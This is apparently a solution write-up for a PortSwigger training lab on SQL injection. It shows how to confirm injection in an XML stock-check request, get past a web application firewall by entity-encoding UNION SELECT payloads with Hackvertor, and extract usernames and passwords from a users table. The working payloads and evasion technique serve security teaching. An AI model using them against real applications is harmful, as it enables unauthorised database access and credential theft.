# Lab-18: [SQL injection with filter bypass via XML encoding](https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding)

This lab contains a SQL injection vulnerability in its stock check feature. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. 

The database contains a users table, which contains the usernames and passwords of registered users.

**Aim :-** To solve the lab, perform a SQL injection attack to retrieve the admin user's credentials, then log in to their account. 

**Hint :-** A web application firewall (WAF) will block requests that contain obvious signs of a SQL injection attack. You'll need to find a way to obfuscate your malicious query to bypass this filter.



## Solution
- Confirm SQLi
    - Capture the 'check stock' request in the **burp suite** and observe the request. ( ``` POST /product/stock ``` )

    - The ``` productId ``` and ``` storeId ``` are in XML format. 
    ```
    <stockCheck>
        <productId>
            1
        </productId>
        <storeId>
            1
        </storeId>
    </stockCheck>
    ```

    - Replace the store id ``` <storeId> 1 </storeId> ``` with ``` <storeId> 1+1 </storeId> ``` to check whether the server evaluates the input.

    - The server respond with a different number of stock that means. That means the server evaluates the input
        - The server calculate ``` 1+1 ``` and return the stock of id ``` 2 ```
    
    - It confirms SQL injection is possible


- Bypass **WAF ( Web Application Firewall )**
    - Use the payload ``` UNION SELECT NULL ``` to check how the server responds
    ``` <storeId> 1 UNION SELECT NULL </storeId> ```

    - The server respond with a **403 Forbidden** error and a ``` "Attack detected" ``` error message.

    - To bypass firewall install **Hackvertor** extension in **burp suite**, select the payload and right-click then select **Extensions > Hackvertor > Encode > dec_entities or hex_entities**

    - The payload will change into ``` <storeId> 1 <@dec_entities>UNION SELECT NULL</@dec_entities></storeId> ```

    - Now the server is responded with null, confirms **firewall bypass**

- Retrieve the ``` administrator ``` password
    - Use the payload ``` UNION SELECT username || ' ~ ' || password FROM users ``` to get the ``` administrator ``` password

    - The payload will look like ``` <storeId> 1 <@dec_entities>UNION SELECT username || ' ~ ' || password FROM users</@dec_entities></storeId> ```

    - The query will select usernames and passwords and concatenate with ~, the server will respond in the form of username ~ password